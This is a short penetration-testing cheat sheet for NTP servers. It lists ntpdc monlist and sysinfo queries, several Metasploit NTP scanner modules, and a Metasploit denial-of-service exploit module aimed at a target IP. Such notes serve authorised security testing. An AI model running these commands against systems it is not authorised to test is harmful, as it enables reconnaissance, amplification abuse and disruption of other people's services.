# NTP

### ntpcd

##### list the last 600 IPs that have queried the server
```bash
ntpdc -c monlist [IP]
```

##### NTP server system information
```bash
ntpdc -c sysinfo [IP]
```

### Metasploit

##### ntp_monlist
```bash
use auxiliary/scanner/ntp/ntp_monlist
set RHOSTS [IP]
set RPORT 123
run
```

##### ntp_readvar
```bash
use auxiliary/scanner/ntp/ntp_readvar
set RHOSTS [IP]
set RPORT 123
run
```

##### ntp_request
```bash
use auxiliary/scanner/ntp/ntp_request
set RHOSTS [IP]
set RPORT 123
run
```


---
---


## Exploitation

### Metasploit

##### ntpd_reserved_dos
```bash
use exploit/linux/ntp/ntpd_reserved_dos
set RHOSTS [IP]
set RPORT 123
run
```
